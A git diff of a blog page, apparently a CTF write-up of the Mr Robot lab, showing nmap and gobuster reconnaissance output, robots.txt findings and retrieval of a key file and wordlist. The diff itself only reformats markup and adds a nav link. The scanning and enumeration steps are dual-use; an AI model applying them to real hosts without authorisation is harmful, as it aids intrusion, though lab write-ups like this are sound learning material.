@@ -105,6 +105,10 @@ As always we are given an IP address and we just have to scan the ip using nmap.
         
       
         
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
           <li><a href="/categories">Categories</a></li>
         
       
@@ -127,6 +131,10 @@ As always we are given an IP address and we just have to scan the ip using nmap.
       
         
           <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
         
       
         
@@ -177,7 +185,6 @@ As always we are given an IP address and we just have to scan the ip using nmap.
   
   
 
-
   
 
   <div class="post-content"><div>
@@ -187,88 +194,90 @@ As always we are given an IP address and we just have to scan the ip using nmap.
 <p><img src="/images/mrRobot/mrRobotSite.png" alt="mrRobotSite"></p>
 <p>Checking the ip address on the browser, we are greeted with a really cool terminal themed web environment where we can interact with the site by entering commands. Inspecting the source code and checking the network calls, we don&rsquo;t really find anything interesting. So lets shift our focus to the nmap scan that we ran.</p>
 <p>Here is a snippet of our nmap scan.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; nmap -sV -sC 10.10.103.189-v
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT    STATE  SERVICE  VERSION
-</span></span><span style="display:flex;"><span>22/tcp  closed ssh
-</span></span><span style="display:flex;"><span>80/tcp  open   http     Apache httpd
-</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
-</span></span><span style="display:flex;"><span>| http-methods: 
-</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache
-</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">443/tcp open   ssl/http Apache httpd
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| http-methods: 
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  Supported Methods: GET HEAD POST OPTIONS
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-server-header: Apache
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>www.example.com
-</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>www.example.com
-</span></span><span style="display:flex;"><span>| Public Key type: rsa
-</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">1024</span>
-</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
-</span></span><span style="display:flex;"><span>| Not valid before: 2015-09-16T10:45:03
-</span></span><span style="display:flex;"><span>| Not valid after:  2025-09-13T10:45:03
-</span></span><span style="display:flex;"><span>| MD5:   3c16 3b19 87c3 42ad <span style="color:#ae81ff">6634</span> c1c9 d0aa fb97
-</span></span><span style="display:flex;"><span>|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
-</span></span></code></pre></div><p>From our scan we can observe that port 80 (http) and 443 (https) are open. So our endpoint or point of entry must be tied to the web content.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; nmap -sV -sC 10.10.103.189-v
+
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache
+|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).
+</span><span style="color:#e6db74">443/tcp open   ssl/http Apache httpd
+</span><span style="color:#e6db74">|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+</span><span style="color:#e6db74">| http-methods: 
+</span><span style="color:#e6db74">|_  Supported Methods: GET HEAD POST OPTIONS
+</span><span style="color:#e6db74">|_http-server-header: Apache
+</span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>www.example.com
+| Issuer: commonName<span style="color:#f92672">=</span>www.example.com
+| Public Key type: rsa
+| Public Key bits: <span style="color:#ae81ff">1024</span>
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2015-09-16T10:45:03
+| Not valid after:  2025-09-13T10:45:03
+| MD5:   3c16 3b19 87c3 42ad <span style="color:#ae81ff">6634</span> c1c9 d0aa fb97
+|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
+
+</code></pre></div><p>From our scan we can observe that port 80 (http) and 443 (https) are open. So our endpoint or point of entry must be tied to the web content.
 Our next step is to enumerate the url and try to find directories or files. We will use <a href="https://github.com/OJ/gobuster">GoBuster</a> and for our wordlists to enumerate we will use Discovery wordlist from <a href="https://github.com/danielmiessler/SecLists">SecLists</a>.</p>
 <p>A snippet of our directory and files enumeration.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; gobuster dir -u http://10.10.103.189 -w /SecLists/Discovery/Web-content/common.txt
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>2023/03/01 21:34:50 Starting gobuster in directory enumeration mode
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 213<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 218<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 218<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/0                    <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/0/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/Image                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/Image/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 235<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/admin/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/atom                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/feed/atom/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/audio                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 235<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/audio/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/blog                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 234<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/blog/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 233<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/css/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/dashboard            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-admin/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/favicon.ico          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/feed                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/feed/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/image                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/image/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 236<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/images/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1104<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 232<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/js/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/intro                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 516314<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/license              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 309<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/login                <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-login.php<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/page1                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/phpmyadmin           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 94<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/rdf                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/feed/rdf/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/readme               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 64<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/render/https://www.google.com <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/render/https:/www.google.com<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/robots               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 41<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/robots.txt           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 41<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/rss                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/feed/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/rss2                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/feed/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/sitemap              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/sitemap.xml          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/video                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 235<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/video/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-admin             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 238<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-admin/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-content           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 240<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-content/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-includes          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 241<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-includes/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-config            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-cron              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-load              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-links-opml        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 227<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-login             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2613<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-mail              <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3064<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-settings          <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/wp-signup            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-login.php?action<span style="color:#f92672">=</span>register<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/xmlrpc               <span style="color:#f92672">(</span>Status: 405<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 42<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/xmlrpc.php           <span style="color:#f92672">(</span>Status: 405<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 42<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">4713</span> / <span style="color:#ae81ff">4714</span> <span style="color:#f92672">(</span>99.98%<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>2023/03/01 21:48:41 Finished
-</span></span></code></pre></div><p>From our enumeration we can observe that the site uses wordpress since our login is redirected to /wp-login.php. We can check out the other files such as the /license, /readme, /sitemap and most importantly /robots.txt.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; gobuster dir -u http://10.10.103.189 -w /SecLists/Discovery/Web-content/common.txt
+<span style="color:#f92672">===============================================================</span>
+2023/03/01 21:34:50 Starting gobuster in directory enumeration mode
+<span style="color:#f92672">===============================================================</span>
+/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 213<span style="color:#f92672">]</span>
+/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 218<span style="color:#f92672">]</span>
+/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 218<span style="color:#f92672">]</span>
+/0                    <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/0/<span style="color:#f92672">]</span>
+/Image                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/Image/<span style="color:#f92672">]</span>
+/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 235<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/admin/<span style="color:#f92672">]</span>
+/atom                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/feed/atom/<span style="color:#f92672">]</span>
+/audio                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 235<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/audio/<span style="color:#f92672">]</span>
+/blog                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 234<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/blog/<span style="color:#f92672">]</span>
+/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 233<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/css/<span style="color:#f92672">]</span>
+/dashboard            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-admin/<span style="color:#f92672">]</span>
+/favicon.ico          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+/feed                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/feed/<span style="color:#f92672">]</span>
+/image                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/image/<span style="color:#f92672">]</span>
+/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 236<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/images/<span style="color:#f92672">]</span>
+/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1104<span style="color:#f92672">]</span>
+/index.php            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/<span style="color:#f92672">]</span>
+/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 232<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/js/<span style="color:#f92672">]</span>
+/intro                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 516314<span style="color:#f92672">]</span>
+/license              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 309<span style="color:#f92672">]</span>
+/login                <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-login.php<span style="color:#f92672">]</span>
+/page1                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/<span style="color:#f92672">]</span>
+/phpmyadmin           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 94<span style="color:#f92672">]</span>
+/rdf                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/feed/rdf/<span style="color:#f92672">]</span>
+/readme               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 64<span style="color:#f92672">]</span>
+/render/https://www.google.com <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/render/https:/www.google.com<span style="color:#f92672">]</span>
+/robots               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 41<span style="color:#f92672">]</span>
+/robots.txt           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 41<span style="color:#f92672">]</span>
+/rss                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/feed/<span style="color:#f92672">]</span>
+/rss2                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/feed/<span style="color:#f92672">]</span>
+/sitemap              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+/sitemap.xml          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+/video                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 235<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/video/<span style="color:#f92672">]</span>
+/wp-admin             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 238<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-admin/<span style="color:#f92672">]</span>
+/wp-content           <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 240<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-content/<span style="color:#f92672">]</span>
+/wp-includes          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 241<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-includes/<span style="color:#f92672">]</span>
+/wp-config            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+/wp-cron              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+/wp-load              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+/wp-links-opml        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 227<span style="color:#f92672">]</span>
+/wp-login             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 2613<span style="color:#f92672">]</span>
+/wp-mail              <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3064<span style="color:#f92672">]</span>
+/wp-settings          <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+/wp-signup            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.103.189/wp-login.php?action<span style="color:#f92672">=</span>register<span style="color:#f92672">]</span>
+/xmlrpc               <span style="color:#f92672">(</span>Status: 405<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 42<span style="color:#f92672">]</span>
+/xmlrpc.php           <span style="color:#f92672">(</span>Status: 405<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 42<span style="color:#f92672">]</span>
+Progress: <span style="color:#ae81ff">4713</span> / <span style="color:#ae81ff">4714</span> <span style="color:#f92672">(</span>99.98%<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+2023/03/01 21:48:41 Finished
+
+</code></pre></div><p>From our enumeration we can observe that the site uses wordpress since our login is redirected to /wp-login.php. We can check out the other files such as the /license, /readme, /sitemap and most importantly /robots.txt.</p>
 <p>In <code>robots.txt</code> we can find two interesting files.</p>
 <pre tabindex="0"><code class="language-url" data-lang="url">http://10.10.103.189/robots.txt
 
@@ -276,22 +285,23 @@ User-agent: *
 fsocity.dic
 key-1-of-3.txt
 </code></pre><p>We have found the first key needed to solve our challenge. Lets retrieve the key and the other file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>url<span style="color:#f92672">=</span>http://10.10.103.189
-</span></span><span style="display:flex;"><span>wget $url/key-1-of-3.txt $url/fsocity.dic
-</span></span><span style="display:flex;"><span>ls
-</span></span><span style="display:flex;"><span>key-1-of-3.txt fsocity.dic
-</span></span></code></pre></div><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">url<span style="color:#f92672">=</span>http://10.10.103.189
+wget $url/key-1-of-3.txt $url/fsocity.dic
+ls
+key-1-of-3.txt fsocity.dic
+
+</code></pre></div><blockquote>
 <p>cat key-1-of-3.txt ****************</p>
 </blockquote>
 <p>Now that we have our first key, let analyse the second file downloaded.
 The second file <code>fsocity.dic</code> is a text file that contains a list of text, so most probably it&rsquo;s a wordlist.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat fsocity.dic | wc -l
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">858160</span>
-</span></span></code></pre></div><p>There are a lot of lines and using sort we can see that there are also a lot of duplicates. So let us sort the list and remove all the duplicates and append the list in a new file.</p>
